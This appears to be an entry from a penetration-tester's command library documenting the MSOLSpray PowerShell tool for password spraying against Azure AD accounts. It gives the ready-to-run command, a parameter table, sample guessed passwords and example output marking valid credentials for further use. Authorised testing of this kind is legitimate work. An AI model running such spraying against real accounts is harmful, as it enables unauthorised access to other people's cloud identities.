---
type: command
executor: powershell
data: >-
  Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD>
  -Verbose
tags:
  - password-spraying
  - azure-ad
platforms:
  - Windows
verified: true
validated: true
---

# msolspray-invoke-password-spray

## Command

```powershell
Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
```

## Description

This command invokes the MSOLSpray function to perform password spraying against a list of Azure AD users using a single password guess. It checks authentication for each user in the list and reports valid credentials, useful for identifying weak passwords in cloud environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -UserList | Path to the text file containing one email address per line | Yes |
| -Password | The password to test against all users | Yes |
| -Verbose | Enables detailed output showing each attempt's status | No |

## Examples

### Basic Usage

```powershell
Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password "Summer20!"
```

### Advanced Usage

```powershell
Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password "Password123" -Verbose
```

## Expected Output

Verbose logs for each user attempt, e.g.:

VERBOSE: Testing user1@target.com with password 'Password123' - SUCCESS
VERBOSE: Testing user2@target.com with password 'Password123' - FAILURE

Successful hits will list the valid credential pair for further use.

## Related

- [[procedures/Azure-Password-Spraying]]
- [[MSOLSpray]] (tool)
